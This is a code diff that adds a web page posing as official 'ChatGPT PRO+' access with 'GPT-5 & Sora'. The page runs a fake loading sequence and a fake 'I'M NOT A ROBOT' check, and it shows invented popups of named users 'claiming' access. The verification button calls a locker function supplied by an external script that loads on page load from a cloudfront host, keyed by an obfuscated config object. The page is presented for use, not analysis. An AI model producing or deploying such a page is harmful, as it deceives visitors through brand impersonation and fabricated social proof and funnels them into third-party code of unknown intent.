@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ChatGPT PRO+ | Official Access</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
+    <style>
+        :root { --primary: #10a37f; --bg: #050505; --card: #111; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; }
+        body { background: var(--bg); color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
+        
+        .container { width: 90%; max-width: 420px; background: var(--card); border: 1px solid #222; border-radius: 24px; padding: 35px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.8); z-index: 10; }
+        .logo { width: 60px; filter: drop-shadow(0 0 10px var(--primary)); margin-bottom: 15px; }
+        
+        /* Elements Visibility */
+        #processing-area, #captcha-area { display: none; }
+
+        .main-btn { width: 100%; padding: 18px; background: var(--primary); color: white; border: none; border-radius: 12px; font-weight: 800; cursor: pointer; font-size: 16px; transition: 0.3s; }
+        .main-btn:hover { background: #0d8a6a; transform: translateY(-2px); }
+
+        /* Loader */
+        .loading-bar { width: 100%; height: 6px; background: #222; border-radius: 10px; margin: 20px 0; overflow: hidden; }
+        .fill { width: 0%; height: 100%; background: var(--primary); box-shadow: 0 0 15px var(--primary); transition: width 0.1s; }
+
+        /* Proof Popups */
+        .proof { position: fixed; bottom: 20px; left: 20px; background: white; color: black; padding: 10px; border-radius: 10px; font-size: 12px; font-weight: bold; display: flex; align-items: center; gap: 8px; box-shadow: 0 10px 20px rgba(0,0,0,0.5); z-index: 5; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div id="start-area">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/ChatGPT_logo.svg" class="logo">
+            <h1>ChatGPT PRO<span style="background:var(--primary); padding:2px 6px; border-radius:4px; font-size:12px; margin-left:5px;">PLUS</span></h1>
+            <p style="color:#888; margin: 20px 0;">Get exclusive access to GPT-5 & Sora AI Video generation. Limited Beta 2026.</p>
+            <button class="main-btn" onclick="startProcess()">CLAIM ACCESS NOW</button>
+        </div>
+
+        <div id="processing-area">
+            <h3 id="status">Connecting...</h3>
+            <div class="loading-bar"><div class="fill" id="fill"></div></div>
+            <p style="font-size: 12px; color: #555;">Neural link establishment in progress</p>
+        </div>
+
+        <div id="captcha-area">
+            <h3 style="color: #ff4b4b;">Verification Required</h3>
+            <p style="margin: 15px 0; font-size: 14px; color: #ccc;">To prevent bots, please complete the human verification below.</p>
+            <button class="main-btn" style="background: white; color: black;" onclick="call_locker();">I'M NOT A ROBOT</button>
+        </div>
+    </div>
+
+    <div id="proof-wrap"></div>
+
+    <script type="text/javascript">
+        var czSSh_sIr_txNVRc={"it":4601450,"key":"8c758"};
+    </script>
+    <script src="https://d19k1sh57v5k0g.cloudfront.net/b31d971.js"></script>
+
+    <script>
+        function startProcess() {
+            document.getElementById('start-area').style.display = 'none';
+            document.getElementById('processing-area').style.display = 'block';
+            
+            let width = 0;
+            const fill = document.getElementById('fill');
+            const status = document.getElementById('status');
+            
+            const logs = ["Searching for Slots...", "Syncing API Keys...", "Encrypting Data...", "Access Granted!"];
+            
+            const interval = setInterval(() => {
+                width++;
+                fill.style.width = width + "%";
+                if(width == 25) status.innerText = logs[0];
+                if(width == 50) status.innerText = logs[1];
+                if(width == 75) status.innerText = logs[2];
+                if(width >= 100) {
+                    clearInterval(interval);
+                    document.getElementById('processing-area').style.display = 'none';
+                    document.getElementById('captcha-area').style.display = 'block';
+                }
+            }, 50);
+        }
+
+        // Social Proofs
+        const names = ["James", "Sarah", "Rahul", "Alex", "Elena"];
+        setInterval(() => {
+            const wrap = document.getElementById('proof-wrap');
+            const name = names[Math.floor(Math.random()*names.length)];
+            wrap.innerHTML = `<div class="proof">👤 ${name} just claimed ChatGPT Pro+ <span style="color:#10a37f; margin-left:5px;">✓</span></div>`;
+            setTimeout(() => { wrap.innerHTML = ''; }, 3000);
+        }, 8000);
+    </script>
+</body>
+</html>
+
